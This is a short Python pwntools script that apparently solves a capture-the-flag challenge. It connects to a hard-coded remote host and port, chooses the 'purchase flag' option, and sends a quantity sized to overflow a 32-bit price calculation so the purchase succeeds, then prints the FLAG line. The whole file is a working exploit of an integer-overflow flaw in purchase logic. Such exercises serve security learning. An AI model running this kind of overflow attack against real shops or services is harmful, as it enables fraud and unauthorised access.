from pwn import *

# Connection details
host = '140.113.24.241'
port = 30170

# Create a connection to the server
conn = remote(host, port)

# Function to interact with the server and perform the exploit
def exploit():
    # Receive the welcome message and current money
    welcome_message = conn.recvuntil(b"Current money: 10")
    
    # Send the choice to purchase the flag
    conn.sendline(b"1")
    
    # Receive the prompt for the amount
    amount_prompt = conn.recvuntil(b"Input the amount:")
    
    # Send a large value to cause an integer overflow
    large_value = str(2**31 // 999999 + 1).encode()
    conn.sendline(large_value)
    
    # Receive and print the response
    purchase_response = conn.recvuntil(b"You have purchased the flag")

    # Try to receive the flag
    while True:
        try:
            flag_response = conn.recvline()
            if not flag_response:
                break
            decoded_response = flag_response.decode().strip()
            if decoded_response.startswith("FLAG{"):
                print(flag_response.decode().strip())
                break
        except EOFError:
            break

# Perform the exploit to capture the flag
exploit()

# Close the connection
conn.close()
